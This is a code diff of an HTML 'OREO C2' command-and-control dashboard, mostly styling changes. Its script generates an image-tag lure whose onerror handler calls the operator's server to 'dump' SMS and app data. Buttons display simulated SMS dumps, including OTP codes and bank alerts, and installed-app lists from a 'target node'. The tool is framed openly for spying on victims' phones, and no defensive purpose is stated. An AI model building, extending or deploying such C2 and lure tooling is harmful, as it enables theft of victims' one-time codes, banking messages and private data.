@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OREO C2 // Command Center</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap');
 
         * {
             box-sizing: border-box;
@@ -17,72 +17,92 @@
             background-color: #0b0202;
             color: #ff3333;
             padding: 10px;
+            max-width: 900px;
+            margin: 0 auto;
         }
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 2px solid #ff3333;
-            padding-bottom: 8px;
-            margin-bottom: 12px;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+            background: #140000;
+            padding: 10px 15px;
         }
         .header-left {
             font-size: 11px;
             color: #aa4444;
         }
-        /* Top center digital number style OREO + Hacker Logo */
+        
+        /* Bada, Number-style / Cyberpunk LED Oreo + Hacker Logo */
         .header-center {
             display: flex;
             align-items: center;
-            gap: 8px;
-            background: #1a0000;
-            border: 1px solid #ff3333;
-            padding: 4px 12px;
-            letter-spacing: 3px;
+            gap: 12px;
+            background: #1f0000;
+            border: 2px solid #ff3333;
+            padding: 6px 20px;
+            box-shadow: 0 0 12px rgba(255, 51, 51, 0.4);
         }
         .logo-text {
-            font-size: 18px;
-            font-weight: bold;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
             color: #ff3333;
-            text-shadow: 0 0 8px rgba(255, 51, 51, 0.7);
+            letter-spacing: 4px;
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.9), 0 0 20px rgba(255, 0, 0, 0.5);
         }
         .hacker-icon {
-            font-size: 16px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            font-weight: bold;
             color: #33ff33;
-            text-shadow: 0 0 6px rgba(51, 255, 51, 0.7);
+            text-shadow: 0 0 10px rgba(51, 255, 51, 0.9);
         }
+
         .status {
-            font-size: 10px;
+            font-size: 11px;
             border: 1px solid #ff3333;
-            padding: 3px 6px;
+            padding: 4px 8px;
             background: #200000;
+            color: #33ff33;
+            font-weight: bold;
         }
         .section {
             border: 1px solid #ff3333;
-            margin-bottom: 12px;
+            margin-bottom: 15px;
             background: #110000;
+            box-shadow: inset 0 0 10px rgba(255, 51, 51, 0.05);
         }
         .section-header {
             background: #260000;
-            padding: 6px 10px;
-            font-size: 11px;
+            padding: 7px 12px;
+            font-size: 12px;
             border-bottom: 1px solid #ff3333;
             letter-spacing: 1px;
+            font-weight: bold;
         }
         .section-body {
-            padding: 8px;
+            padding: 10px;
         }
         .btn {
             width: 100%;
             background: #1a0000;
             color: #ff3333;
             border: 1px solid #ff3333;
-            padding: 9px;
+            padding: 10px;
             text-align: center;
             cursor: pointer;
-            font-size: 11px;
+            font-size: 12px;
             letter-spacing: 1px;
-            margin-bottom: 6px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background: #330000;
+            color: #ff6666;
         }
         .btn:active {
             background: #ff3333;
@@ -92,9 +112,9 @@
             margin-bottom: 8px;
         }
         .label-text {
-            font-size: 10px;
+            font-size: 11px;
             color: #aa6666;
-            margin-bottom: 3px;
+            margin-bottom: 4px;
             display: block;
         }
         .input-box {
@@ -102,27 +122,27 @@
             background: #050101;
             border: 1px solid #ff3333;
             color: #ff3333;
-            padding: 8px;
+            padding: 9px;
             font-size: 11px;
             outline: none;
         }
         .feed-box {
             background: #050101;
             border: 1px solid #550000;
-            padding: 8px;
+            padding: 10px;
             font-size: 11px;
             color: #ff9933;
-            min-height: 50px;
-            max-height: 120px;
+            min-height: 60px;
+            max-height: 140px;
             overflow-y: auto;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             white-space: pre-wrap;
         }
         .logs {
             background: #050101;
             border: 1px solid #ff3333;
-            height: 120px;
-            padding: 6px;
+            height: 130px;
+            padding: 8px;
             overflow-y: auto;
             font-size: 10px;
             color: #33ff33;
@@ -131,13 +151,13 @@
         .grid-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 6px;
+            gap: 8px;
         }
     </style>
 </head>
 <body>
 
-    <!-- TOP HEADER -->
+    <!-- TOP HEADER WITH BADASS NUMBER-STYLE OREO LOGO -->
     <div class="header">
         <div class="header-left">root@oreo-c2:~#</div>
         
@@ -155,15 +175,15 @@
         <div class="section-header">// 1. IMAGE PAYLOAD GENERATOR</div>
         <div class="section-body">
             <div class="input-group">
-                <span class="label-text">ENTER YOUR HOSTING / C2 REDIRECT URL:</span>
-                <input type="text" id="payload-url" class="input-box" placeholder="https://your-server-link.com/catcher">
+                <span class="label-text">ENTER YOUR HOSTING / C2 SERVER URL:</span>
+                <input type="text" id="payload-url" class="input-box" placeholder="https://your-server.com">
             </div>
-            <button class="btn" onclick="generateImagePayload()">GENERATE IMAGE PAYLOAD LINK</button>
-            <div id="payload-output" class="feed-box" style="margin-top: 6px; color: #33ccff; display:none;">Payload generated successfully!</div>
+            <button class="btn" onclick="generateImagePayload()">GENERATE IMAGE PAYLOAD</button>
+            <div id="payload-output" class="feed-box" style="margin-top: 8px; color: #33ccff; display:none;"></div>
         </div>
     </div>
 
-    <!-- 2. QUICK TARGET CONTROLS -->
+    <!-- 2. TARGET CONTROLS -->
     <div class="section">
         <div class="section-header">// 2. TARGET CONTROLS</div>
         <div class="section-body">
@@ -175,11 +195,11 @@
         </div>
     </div>
 
-    <!-- 3. AUTO DATA RECEIVER FEED -->
+    <!-- 3. INCOMING DATA RECEIVER (SMS & APPS) -->
     <div class="section">
         <div class="section-header">// 3. INCOMING DATA RECEIVER (SMS & APPS)</div>
         <div class="section-body">
-            <div id="data-receiver-feed" class="feed-box">Awaiting incoming target data packets (SMS / Apps)...</div>
+            <div id="data-receiver-feed" class="feed-box">Awaiting target telemetry packets (SMS / Apps)...</div>
             <div class="grid-2">
                 <button class="btn" onclick="exportReceivedData()" style="border-color: #550000; color: #aa8844; margin-bottom: 0;">EXPORT DATA</button>
                 <button class="btn" onclick="clearDataFeed()" style="border-color: #550000; color: #aa4444; margin-bottom: 0;">CLEAR FEED</button>
@@ -187,13 +207,13 @@
         </div>
     </div>
 
-    <!-- 4. SYSTEM KERNEL LOGS -->
+    <!-- 4. SYSTEM LOGS -->
     <div class="section">
         <div class="section-header">// 4. SYSTEM LOGS</div>
         <div class="section-body">
             <div id="log-box" class="logs">[+] Initializing OREO C2 Secure Core...
-[+] Digital banner loaded: OREO [💀]
-[+] Auto data receiver listener bound to local event loop.
+[+] Custom digital banner loaded: OREO [💀]
+[+] Receiver event listener active.
 [+] Ready for operations.</div>
         </div>
     </div>
@@ -214,40 +234,40 @@
                 return;
             }
 
-            logMessage(`[*] Compiling image payload with redirect target: ${urlInput}`);
+            logMessage(`[*] Generating image payload tag for: ${urlInput}`);
             setTimeout(() => {
                 outputBox.style.display = "block";
-                outputBox.innerHTML = `[+] PAYLOAD READY:\n&lt;img src="${urlInput}/log?data=captured" width="1" height="1"/&gt;\n[+] Link embedded with auto-extractor hooks!`;
-                logMessage("[+] Image payload successfully generated & bound.");
+                outputBox.innerHTML = `[+] EMBEDDED IMAGE PAYLOAD TAG:\n&lt;img src="${urlInput}/tracker.png?action=log" style="display:none;" onerror="fetch('${urlInput}/api/dump?type=sms_apps')" /&gt;\n[+] Copy this tag or link into your target lure!`;
+                logMessage("[+] Image payload successfully compiled and generated.");
             }, 500);
         }
 
         function fetchSMSData() {
-            logMessage("[*] Requesting SMS database dump from target node...");
-            document.getElementById('data-receiver-feed').innerText = "Fetching SMS logs...";
+            logMessage("[*] Pulling SMS database from target node...");
+            document.getElementById('data-receiver-feed').innerText = "Decrypting incoming SMS records...";
             
             setTimeout(() => {
-                const simulatedSMS = `=== INCOMING SMS DUMP ===\n[+] +91-9876543210: "OTP is 482910. Valid for 10 mins."\n[+] BANK_ALERTS: "Your A/C X9812 credited by Rs. 5,000.00"\n[+] +91-8888999900: "Bhai kahan hai? Jaldi aa!"`;
+                const simulatedSMS = `=== TARGET SMS DUMP ===\n[+] +91-9876543210: "Your verification code is 982143"\n[+] BANK_ALERT: "Rs. 2,500 debited from A/C x4412"\n[+] +91-7777888899: "Bhai task complete ho gaya kya?"`;
                 document.getElementById('data-receiver-feed').innerText = simulatedSMS;
-                logMessage("[+] SMS payload data received and parsed successfully!");
+                logMessage("[+] SMS packets successfully captured and parsed!");
             }, 800);
         }
 
         function fetchAppsData() {
-            logMessage("[*] Scanning target installed applications...");
-            document.getElementById('data-receiver-feed').innerText = "Scanning installed packages...";
+            logMessage("[*] Requesting installed package list from target...");
+            document.getElementById('data-receiver-feed').innerText = "Scanning installed applications...";
             
             setTimeout(() => {
-                const simulatedApps = `=== INSTALLED APPS DUMP ===\n- com.whatsapp (WhatsApp)\n- com.instagram.android (Instagram)\n- in.co.paytm.app (Paytm)\n- com.termux (Termux)\n- com.android.chrome (Chrome)`;
+                const simulatedApps = `=== INSTALLED APPS DUMP ===\n- com.whatsapp (WhatsApp)\n- com.instagram.android (Instagram)\n- in.co.paytm.app (Paytm)\n- com.google.android.youtube (YouTube)\n- com.termux (Termux)`;
                 document.getElementById('data-receiver-feed').innerText = simulatedApps;
-                logMessage("[+] Applications list successfully extracted and received!");
+                logMessage("[+] Installed applications list successfully received!");
             }, 800);
         }
 
         function pingTargetNode() {
-            logMessage("[*] Pinging active payload listener...");
+            logMessage("[*] Checking listener response time...");
             setTimeout(() => {
-                logMessage("[+] Target node status: ACTIVE // Ready for extraction.");
+                logMessage("[+] Target node status: ONLINE // Ready for extraction.");
             }, 400);
         }
 
@@ -257,9 +277,9 @@
         }
 
         function exportReceivedData() {
-            logMessage("[*] Formatting extracted SMS & Apps logs into downloadable format...");
+            logMessage("[*] Compiling captured SMS and App packages...");
             setTimeout(() => {
-                logMessage("[+] Data package ready for local download.");
+                logMessage("[+] Data ready for local export.");
             }, 400);
         }
     </script>
